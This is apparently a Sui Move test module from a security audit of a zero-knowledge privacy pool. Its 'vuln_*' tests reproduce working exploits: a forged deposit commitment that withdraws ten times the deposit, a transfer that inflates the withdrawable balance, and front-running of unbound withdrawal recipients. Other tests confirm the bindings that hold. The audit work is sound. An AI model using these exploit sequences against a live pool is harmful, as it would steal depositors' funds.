/// Public-input binding audit (docs/research/2026-11-16-public-input-binding-audit.md).
///
/// Every test replays REAL Groth16 proofs (binding_audit_fixtures.move, generated by
/// scripts/bench/binding-audit.mjs) through `sui::groth16` on the unmodified pool code.
///
/// `vuln_*` tests are characterization tests: they assert the CURRENT, VULNERABLE behaviour so
/// the audit's numbers are reproducible by `sui move test`. When the fix lands, each must be
/// inverted into an `#[expected_failure]` test with the new abort code, never deleted.
/// `bound_*` tests assert bindings that do hold.
#[test_only]
module veil::binding_audit_tests;

use sui::clock::{Self, Clock};
use sui::coin::{Self, Coin};
use sui::test_scenario::{Self, Scenario};
use veil::binding_audit_fixtures as fx;
use veil::pool::{Self, Pool, AdminCap};
use veil::test_helpers;
use veil::token::TOKEN;

const ADMIN: address = @0xA;
const VICTIM: address = @0xB;
const ATTACKER: address = @0xC;
const FRONT_RUNNER: address = @0xF;

const TOKEN_UNIT: u64 = 1_000_000;
const THRESHOLD: u64 = 1_000_000_000; // 1000 TOKEN, must equal the transfer proof's public input
const EPOCH_MS: u64 = 3_600_000;

// ── helpers ────────────────────────────────────────────────────────────────

/// Pool with the dev transfer + withdraw VKs, `victim_tokens` of honest liquidity, clock at epoch 0.
fun setup(scenario: &mut Scenario, threshold: u64, victim_tokens: u64): Clock {
    pool::create_pool(fx::transfer_vk(), threshold, EPOCH_MS, scenario.ctx());
    scenario.next_tx(ADMIN);
    let clock = clock::create_for_testing(scenario.ctx());
    {
        let mut pool = scenario.take_shared<Pool>();
        let cap = scenario.take_from_sender<AdminCap>();
        pool::propose_withdraw_vk(&mut pool, &cap, fx::withdraw_vk(), &clock); // live at epoch 1
        test_scenario::return_shared(pool);
        scenario.return_to_sender(cap);
    };
    // Honest liquidity: 1000-TOKEN deposits with unrelated commitments.
    let mut i = 0;
    while (i < victim_tokens / 1000) {
        scenario.next_tx(VICTIM);
        let mut pool = scenario.take_shared<Pool>();
        let c = coin::mint_for_testing<TOKEN>(1000 * TOKEN_UNIT, scenario.ctx());
        pool::deposit_and_register(&mut pool, c, test_helpers::valid_commitment((i as u8) + 1), &clock, scenario.ctx());
        test_scenario::return_shared(pool);
        i = i + 1;
    };
    clock
}

fun deposit(scenario: &mut Scenario, who: address, tokens: u64, commitment: vector<u8>, clock: &Clock) {
    scenario.next_tx(who);
    let mut pool = scenario.take_shared<Pool>();
    let c = coin::mint_for_testing<TOKEN>(tokens * TOKEN_UNIT, scenario.ctx());
    pool::deposit_and_register(&mut pool, c, commitment, clock, scenario.ctx());
    test_scenario::return_shared(pool);
}

fun withdraw(scenario: &mut Scenario, caller: address, proof: vector<u8>, inputs: vector<u8>, to: address, clock: &Clock) {
    scenario.next_tx(caller);
    let mut pool = scenario.take_shared<Pool>();
    pool::zk_withdraw(&mut pool, proof, inputs, to, clock, scenario.ctx());
    test_scenario::return_shared(pool);
}

fun received(scenario: &mut Scenario, who: address): u64 {
    scenario.next_tx(who);
    let c = scenario.take_from_sender<Coin<TOKEN>>();
    let v = c.value();
    scenario.return_to_sender(c);
    v
}

fun pool_balance(scenario: &mut Scenario): u64 {
    scenario.next_tx(ADMIN);
    let pool = scenario.take_shared<Pool>();
    let b = pool.pool_balance();
    test_scenario::return_shared(pool);
    b
}

// ── V1: deposit amount is not bound to the commitment ─────────────────────

/// Attacker deposits 100 TOKEN under a commitment that opens to cumulativeOld = 1000 TOKEN and
/// withdraws 1000 TOKEN one epoch later. Nothing on-chain relates `coin.value()` to the commitment.
#[test]
fun vuln_forged_deposit_withdraws_10x() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 2000);
    deposit(&mut scenario, ATTACKER, 100, fx::forged_commitment(), &clock);
    assert!(pool_balance(&mut scenario) == 2100 * TOKEN_UNIT, 0);

    clock::set_for_testing(&mut clock, EPOCH_MS); // epoch 1: VK live, commitment mature
    withdraw(&mut scenario, ATTACKER, fx::forged_proof(), fx::forged_inputs(), ATTACKER, &clock);

    let got = received(&mut scenario, ATTACKER);
    assert!(got == 1000 * TOKEN_UNIT, 1);                       // paid out 1000 TOKEN
    assert!(got == 10 * (100 * TOKEN_UNIT), 2);                 // = 10x the attacker's deposit
    assert!(pool_balance(&mut scenario) == 1100 * TOKEN_UNIT, 3); // 900 TOKEN of victims' funds gone
    clock::destroy_for_testing(clock);
    scenario.end();
}

// ── V2: transfer raises the value withdraw pays out ───────────────────────

/// No forged commitment: the frontend's own genesis commitment Poseidon(1,0,0,s) after a 100 TOKEN
/// deposit, one valid shielded_transfer of 1000 TOKEN (spending counter 0 -> 1000), then a valid
/// zk_withdraw of 1000 TOKEN. withdraw.circom reads the transfer *spending* counter as a *balance*.
#[test]
fun vuln_transfer_inflates_withdrawable_balance() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 2000);
    deposit(&mut scenario, ATTACKER, 100, fx::genesis_commitment(), &clock);
    scenario.next_tx(ADMIN);
    {
        let mut pool = scenario.take_shared<Pool>();
        let cap = scenario.take_from_sender<AdminCap>();
        pool::update_commitment_root(&mut pool, &cap, fx::genesis_root(), &clock); // live at epoch 1
        test_scenario::return_shared(pool);
        scenario.return_to_sender(cap);
    };

    clock::set_for_testing(&mut clock, EPOCH_MS); // epoch 1
    scenario.next_tx(ATTACKER);
    {
        let mut pool = scenario.take_shared<Pool>();
        pool::shielded_transfer(&mut pool, fx::inflate_transfer_proof(), fx::inflate_transfer_inputs(), &clock, scenario.ctx());
        test_scenario::return_shared(pool);
    };
    assert!(pool_balance(&mut scenario) == 2100 * TOKEN_UNIT, 0); // transfer moved no value

    clock::set_for_testing(&mut clock, 2 * EPOCH_MS); // epoch 2: new commitment mature
    withdraw(&mut scenario, ATTACKER, fx::inflate_withdraw_proof(), fx::inflate_withdraw_inputs(), ATTACKER, &clock);

    let got = received(&mut scenario, ATTACKER);
    assert!(got == 1000 * TOKEN_UNIT, 1);
    assert!(got == 10 * (100 * TOKEN_UNIT), 2);
    assert!(pool_balance(&mut scenario) == 1100 * TOKEN_UNIT, 3);
    clock::destroy_for_testing(clock);
    scenario.end();
}

// ── V3 (= threat-model E7): recipientHash is never compared on-chain ───────

/// A proof committing to recipient 0xD is submitted by a front-runner with `recipient = 0xF`.
#[test]
fun vuln_withdraw_recipient_not_bound() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 1000);
    deposit(&mut scenario, VICTIM, 100, fx::victim_commitment(), &clock);
    clock::set_for_testing(&mut clock, EPOCH_MS);
    withdraw(&mut scenario, FRONT_RUNNER, fx::victim_proof(), fx::victim_inputs(), FRONT_RUNNER, &clock);
    assert!(received(&mut scenario, FRONT_RUNNER) == 100 * TOKEN_UNIT, 0);
    clock::destroy_for_testing(clock);
    scenario.end();
}

// ── bindings that hold ─────────────────────────────────────────────────────

/// withdrawAmount: flipping one bit of the public amount (1000 -> 1000 + 2^24 units) breaks the proof.
#[test]
#[expected_failure(abort_code = 28, location = veil::pool)] // E_INVALID_WITHDRAW_PROOF
fun bound_withdraw_amount_tamper_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 2000);
    deposit(&mut scenario, ATTACKER, 100, fx::forged_commitment(), &clock);
    clock::set_for_testing(&mut clock, EPOCH_MS);
    let mut inputs = fx::forged_inputs();
    *&mut inputs[35] = inputs[35] ^ 1;
    withdraw(&mut scenario, ATTACKER, fx::forged_proof(), inputs, ATTACKER, &clock);
    abort 999
}

/// commitment / nullifier: replaying a withdrawal is rejected (commitment already consumed).
#[test]
#[expected_failure(abort_code = 9, location = veil::pool)] // E_COMMITMENT_CHAIN_BROKEN
fun bound_withdraw_replay_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 3000);
    deposit(&mut scenario, ATTACKER, 100, fx::forged_commitment(), &clock);
    clock::set_for_testing(&mut clock, EPOCH_MS);
    withdraw(&mut scenario, ATTACKER, fx::forged_proof(), fx::forged_inputs(), ATTACKER, &clock);
    withdraw(&mut scenario, ATTACKER, fx::forged_proof(), fx::forged_inputs(), ATTACKER, &clock);
    abort 999
}

/// commitment: a withdrawal of a commitment never registered on-chain is rejected.
#[test]
#[expected_failure(abort_code = 9, location = veil::pool)]
fun bound_withdraw_unregistered_commitment_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 2000);
    clock::set_for_testing(&mut clock, EPOCH_MS);
    withdraw(&mut scenario, ATTACKER, fx::forged_proof(), fx::forged_inputs(), ATTACKER, &clock);
    abort 999
}

/// merkleRoot: a valid transfer proof against a root the pool does not hold is rejected.
#[test]
#[expected_failure(abort_code = 32, location = veil::pool)] // E_MERKLE_ROOT_MISMATCH
fun bound_transfer_root_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 0);
    deposit(&mut scenario, ATTACKER, 100, fx::genesis_commitment(), &clock);
    clock::set_for_testing(&mut clock, EPOCH_MS); // no update_commitment_root was proposed
    scenario.next_tx(ATTACKER);
    let mut pool = scenario.take_shared<Pool>();
    pool::shielded_transfer(&mut pool, fx::inflate_transfer_proof(), fx::inflate_transfer_inputs(), &clock, scenario.ctx());
    abort 999
}

/// threshold: a valid transfer proof for 1000 TOKEN is rejected by a pool whose threshold is 999.
#[test]
#[expected_failure(abort_code = 5, location = veil::pool)] // E_THRESHOLD_MISMATCH
fun bound_transfer_threshold_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD - TOKEN_UNIT, 0);
    clock::set_for_testing(&mut clock, EPOCH_MS);
    scenario.next_tx(ATTACKER);
    let mut pool = scenario.take_shared<Pool>();
    pool::shielded_transfer(&mut pool, fx::inflate_transfer_proof(), fx::inflate_transfer_inputs(), &clock, scenario.ctx());
    abort 999
}

/// epochId: a proof for epoch 1 is rejected at epoch 3 (only current and previous accepted).
#[test]
#[expected_failure(abort_code = 8, location = veil::pool)] // E_EPOCH_MISMATCH
fun bound_transfer_stale_epoch_rejected() {
    let mut scenario = test_scenario::begin(ADMIN);
    let mut clock = setup(&mut scenario, THRESHOLD, 0);
    clock::set_for_testing(&mut clock, 3 * EPOCH_MS);
    scenario.next_tx(ATTACKER);
    let mut pool = scenario.take_shared<Pool>();
    pool::shielded_transfer(&mut pool, fx::inflate_transfer_proof(), fx::inflate_transfer_inputs(), &clock, scenario.ctx());
    abort 999
}
